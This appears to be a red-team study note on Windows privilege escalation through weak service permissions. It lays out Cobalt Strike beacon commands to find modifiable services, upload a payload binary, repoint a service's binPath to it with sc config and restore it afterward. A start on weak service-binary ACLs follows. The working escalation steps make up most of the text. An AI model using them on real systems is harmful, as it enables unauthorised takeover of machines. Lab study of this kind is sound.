
If we are allowed to changeconfig of a service we can execute a arbitary binary

```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

=== Modifiable Services ===

	Service 'VulnService2' (State: Running, StartMode: Auto)
```

```
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access

ServiceRights     : ChangeConfig, Start, Stop
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None
```

**Authenticated Users can: ChangeConfig, Start, Stop**

```
beacon> mkdir C:\Temp
beacon> cd C:\Temp
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
[SC] ChangeServiceConfig SUCCESS
```

Validate that the path is updated:

```
run sc qc VulnService2
```

Restart the service and connect to the beacon

> [!OPSEC]
> Restore the service to previous state 

```
run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Service 2.exe"\"
```

> [!warning] 
>  The additional set of escaped quotes is necessary to ensure that the path remains fully quoted, otherwise you could introduce a new unquoted service path vulnerability. 

## Weak Service Binary Permissions

```
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\Vulnerable Services\Service 3.exe
Owner  : BUILTIN\Administrators
Group  : DEV\Domain Users
Access : BUILTIN\Users Allow  Modify, Synchronize
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
Audit  : 
Sddl   : O:BAG:DUD:AI(A;;0x1301bf;;;BU)(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;0x1200a9;;;AC)(A;ID;0x1200
         a9;;;S-1-15-2-2)
```

 BUILTIN\Users:  Allow  Modify, Synchronize